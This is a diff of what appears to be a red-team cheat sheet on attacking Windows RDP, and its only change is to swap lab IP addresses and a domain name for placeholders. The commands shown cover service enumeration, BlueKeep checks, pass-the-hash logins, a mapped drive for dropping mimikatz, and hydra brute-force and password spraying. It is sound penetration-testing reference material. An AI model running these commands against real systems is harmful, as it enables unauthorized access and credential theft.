@@ -121,7 +121,7 @@ Older Windows (or admin-customized configs) often deviate.
 ### Service scan
 
 ```shell
-sudo nmap 10.129.14.128 -sV -sC -p3389
+sudo nmap 10.0.14.128 -sV -sC -p3389
 ```
 
 ```
@@ -158,11 +158,11 @@ The TLS cert subject (`commonName=WIN-SQL01`) reveals the hostname even when DNS
 Dedicated audit tool for RDP security configuration:
 
 ```shell
-rdp-sec-check.pl 10.129.14.128
+rdp-sec-check.pl 10.0.14.128
 ```
 
 ```
-Starting rdp-sec-check v0.9-beta against 10.129.14.128:3389
+Starting rdp-sec-check v0.9-beta against 10.0.14.128:3389
 
 Summary of protocols and ciphers supported:
 [+] Negotiated security layer
@@ -195,13 +195,13 @@ If `CredSSP (NLA) supported: FALSE` is reported, the operator-relevant impact is
 
 ```shell
 # NLA enforcement check
-nmap -p3389 --script rdp-enum-encryption 10.129.14.128
+nmap -p3389 --script rdp-enum-encryption 10.0.14.128
 
 # Screenshot the pre-auth banner (only works if NLA is disabled)
-nmap -p3389 --script rdp-screenshot 10.129.14.128
+nmap -p3389 --script rdp-screenshot 10.0.14.128
 
 # Older Microsoft RDP-CVE checks
-nmap -p3389 --script "rdp-vuln-ms12-020" 10.129.14.128
+nmap -p3389 --script "rdp-vuln-ms12-020" 10.0.14.128
 ```
 
 ### BlueKeep / DejaBlue detection
@@ -210,12 +210,12 @@ The Metasploit modules:
 
 ```shell
 msf > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > run
 
 # Or DejaBlue specifically
 msf > use auxiliary/scanner/rdp/cve_2019_1181_1182_chksum
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > run
 ```
 
@@ -226,7 +226,7 @@ These check for the vulnerable code path without actually triggering the bug. If
 `xfreerdp` is the operator-preferred RDP client on Linux:
 
 ```shell
-xfreerdp /v:10.129.14.128 /u:Administrator /p:'P4ssw0rd!' \
+xfreerdp /v:10.0.14.128 /u:Administrator /p:'P4ssw0rd!' \
          /size:1280x800 /cert:ignore +clipboard /drive:share,/tmp
 ```
 
@@ -251,7 +251,7 @@ Useful options:
 A typical operator session with file transfer enabled:
 
 ```shell
-xfreerdp /v:10.129.14.128 /u:'INFREIGHT\admin' /p:'p4ss' \
+xfreerdp /v:10.0.14.128 /u:'EXAMPLE\admin' /p:'p4ss' \
          /size:1920x1080 /cert:ignore +clipboard \
          /drive:tools,/home/operator/windows-tools
 ```
@@ -261,7 +261,7 @@ Now your `windows-tools` directory appears as a drive on the remote - drop `mimi
 ### Pass-the-hash with xfreerdp
 
 ```shell
-xfreerdp /v:10.129.14.128 /u:Administrator \
+xfreerdp /v:10.0.14.128 /u:Administrator \
          /pth:31d6cfe0d16ae931b73c59d7e0c089c0:31d6cfe0d16ae931b73c59d7e0c089c0 \
          /cert:ignore
 ```
@@ -275,17 +275,17 @@ For pass-the-hash to work over RDP, the target's `Restricted Admin` mode must be
 The older alternative client. Sometimes works better with very-old Windows RDP versions:
 
 ```shell
-rdesktop -u Administrator -p 'P4ssw0rd!' 10.129.14.128
+rdesktop -u Administrator -p 'P4ssw0rd!' 10.0.14.128
 ```
 
 ### Brute-force
 
 ```shell
-hydra -L users.txt -P passwords.txt rdp://10.129.14.128
-crowbar -b rdp -s 10.129.14.128/32 -u Administrator -C passwords.txt
+hydra -L users.txt -P passwords.txt rdp://10.0.14.128
+crowbar -b rdp -s 10.0.14.128/32 -u Administrator -C passwords.txt
 
 # Spray (one password across many usernames)
-hydra -L users.txt -p 'Spring2024!' rdp://10.129.14.128
+hydra -L users.txt -p 'Spring2024!' rdp://10.0.14.128
 ```
 
 Windows RDP has no rate-limiting by default. Bigger concern: Active Directory account-lockout policy. Spraying with one password per user per day is the standard safe pattern in red-team work; testing with permission allows faster cycles.
